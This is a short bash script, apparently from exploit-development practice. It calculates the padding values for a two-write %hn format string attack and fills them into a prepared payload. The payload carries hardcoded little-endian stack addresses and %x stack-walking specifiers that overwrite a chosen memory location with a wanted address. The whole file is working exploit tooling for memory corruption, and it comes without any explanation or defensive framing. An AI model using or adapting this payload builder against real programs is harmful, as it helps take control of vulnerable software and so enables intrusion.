#!/bin/bash
# Little format string address calculation helper.
# Takes current value that is written with two %hn operators without any padding specifiers.
# Takes the address we want to achieve and calcultes both padding specifiers
# Optionally we can also provide the format string/format string echo command to automatically substitute the calculated holder values
# For half-byte writes performed with %hn, like echo -en "Y\x4c\xf4\xff\xbfJUNK\x4e\xf4\xff\xbf%x%x%x%x%x%x%x%x%x%x%x%x%HEREx%hn%AND_HEREx%hn

FORMAT_STRING='echo -en "Y\x4c\xf4\xff\xbfJUNK\x4e\xf4\xff\xbf%x%x%x%x%x%x%x%x%x%x%x%x%FIRST_HOLDERx%hn%SECOND_HOLDERx%hn"'
CURRENT=0x006d0065
WANTED=0xbffff730

echo "CURRENT: $CURRENT"
echo "WANTED: $WANTED"
#FORMULA: WANTED - CURRENT + 8


#WE START WITH THE YOUNGER HALF (YOUNGER BITS)
FIRST_CURRENT="0x"`echo -n $CURRENT|cut -b 7,8,9,10`
FIRST_WANTED="0x"`echo -n $WANTED|cut -b 7,8,9,10`
SECOND_CURRENT="0x"`echo -n $CURRENT|cut -b 3,4,5,6`
SECOND_WANTED="0x"`echo -n $WANTED|cut -b 3,4,5,6`

echo "FIRST_CURRENT: $FIRST_CURRENT"
echo "FIRST_WANTED: $FIRST_WANTED"
echo "SECOND_WANTED: $SECOND_WANTED"
echo "SECOND_CURRENT: $SECOND_CURRENT"

FORMULA=$((FIRST_WANTED-FIRST_CURRENT+8))
if [ $FORMULA -lt 0 ]; then
	FIRST_CURRENT="0x1"`echo $FIRST_CURRENT|xargs printf "%04x"`
	echo "The new FIRST_CURRENT: $FIRST_CURRENT"
	FORMULA=$((FIRST_WANTED-FIRST_CURRENT+0x8))
fi;

echo "The first number must be: $FORMULA"
FIRST_HOLDER=$FORMULA

DIFF=$((SECOND_CURRENT-FIRST_CURRENT))
SECOND_CURRENT=$((FIRST_WANTED+DIFF))


FORMULA=$((SECOND_WANTED-SECOND_CURRENT+8))

if [ $FORMULA -lt 0 ]; then
	SECOND_WANTED="0x1"`echo $SECOND_WANTED|xargs printf "%04x"`
	echo "The new SECOND_CURRENT: $SECOND_WANTED"
	FORMULA=$((SECOND_WANTED-SECOND_CURRENT+0x8))
fi;
echo "The second number must be: $FORMULA"

SECOND_HOLDER=$FORMULA

FORMAT_STRING=`echo $FORMAT_STRING|sed s/FIRST_HOLDER/$FIRST_HOLDER/`
FORMAT_STRING=`echo $FORMAT_STRING|sed s/SECOND_HOLDER/$SECOND_HOLDER/`
echo $FORMAT_STRING
